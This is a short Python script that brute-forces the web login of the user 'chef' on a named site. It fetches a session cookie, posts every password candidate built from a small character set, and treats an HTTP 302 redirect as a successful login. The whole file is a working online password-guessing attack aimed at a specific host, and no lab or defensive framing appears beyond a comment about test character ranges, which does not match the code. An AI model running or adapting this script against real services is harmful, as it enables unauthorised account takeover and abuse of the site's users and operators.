import requests


def init_session() -> requests.Session :
    '''
    Create a Web session on the client and setting a cookie for the session id "PHPSESSID" and return the session object
    '''

    session=requests.session()
    res=session.get(url='http://www.e-commune.org/')
    cookie=res.headers['Set-Cookie'].split('=',1)
    session.cookies.set(cookie[0], cookie[1], domain='www.e-commune.org', path='/')
    return session

def check_password(s : requests.Session, password : str) -> bool:
    '''
    Checks if the creds are correct
    '''    
    data={'login':'chef', 'pass':password}
    url='http://www.e-commune.org/login.php'
    res=s.post(url, data=data, allow_redirects=False)
    return res.status_code==302


def bruteforce(s : requests.Session) -> str :
    charset = ''.join(chr(i) for i in range(97, 108))  # ASCII from space to ~ [32 .. 127]  ## in case of tests set interval of chars between [a..o] 97 .. 112
    base = len(charset)
    length=1
    while True :
         
        for num in range(base ** length):
            password = ""
            for _ in range(length):
                num, remainder = divmod(num, base)
                password = charset[remainder] + password
            print(password)
            if(check_password(s,password)) :
                return password
        length+=1

if __name__ == "__main__":

    session=init_session()
    print("password is : " + bruteforce(session))
    